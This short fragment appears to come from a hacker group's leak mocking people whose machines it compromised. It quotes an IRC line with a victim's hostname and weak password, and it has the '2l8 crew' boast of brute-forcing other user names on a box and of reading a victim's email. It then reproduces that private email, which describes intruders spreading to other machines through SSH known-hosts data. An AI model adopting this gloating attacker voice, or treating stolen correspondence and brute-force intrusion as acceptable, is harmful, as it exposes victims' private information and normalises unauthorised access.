14:44:49 [zed`!~zed@ti132110a340-2098.bb.online.no] Hmm yeah, i doubt my temp123 was 
secure enough ;x
# temp123 is weak sauce. not tasty enough for 2l8 crew.

started bruting every other user name on the box

#Also, dubkat thinks x0x0x2 was bad. welcome to 2l8.
# we read your email!:) no wonder you clueless  idiots get owned alot:
sorry our conversation log is in html.
this is regarding the stuff posted at http://sigterm.us/x0x0x2.txt
as you can see, a ton of people got owned... and of course they 
were able toget access to most of my other machines, probably by looking at
~/.ssh/knownhosts my passwords, and ssh-keys have been changed multiple times, 
most recently
today... just to make sure.
im just paranoid that someone may still have access somewhere.
